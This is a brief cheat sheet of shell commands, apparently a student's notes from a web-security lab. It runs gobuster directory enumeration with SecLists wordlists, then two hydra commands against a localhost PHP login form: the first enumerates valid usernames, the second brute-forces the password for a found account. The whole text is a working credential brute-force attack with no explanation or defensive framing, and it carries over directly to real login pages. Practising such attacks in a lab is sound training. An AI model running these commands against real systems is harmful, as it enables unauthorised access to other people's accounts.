gobuster & seclists

cd /usr/share/seclists/Discovery/Web-Content

gobuster dir -w common.txt -u http://

cd /usr/share/seclists

# Copy both files to Desktop
cp ~/Music/custom_wordlist.txt ~/Desktop/custom_wordlist.txt
cp ~/Music/usernames.txt ~/Desktop/usernames.txt
# Step 1: Find valid usernames (fast scan)
hydra -t 1 -V -f -L ~/Desktop/usernames.txt -p wrongpass123 localhost http-post-form "/oo-main/day6-2/day6/php/login.php:username=^USER^&password=^PASS^:F=not found"
# Step 2: Crack the password for found username (replace "student" with what you found)
hydra -t 1 -V -f -l student -P ~/Desktop/custom_wordlist.txt localhost http-post-form "/oo-main/day6-2/day6/php/login.php:username=^USER^&password=^PASS^:F=Incorrect password"
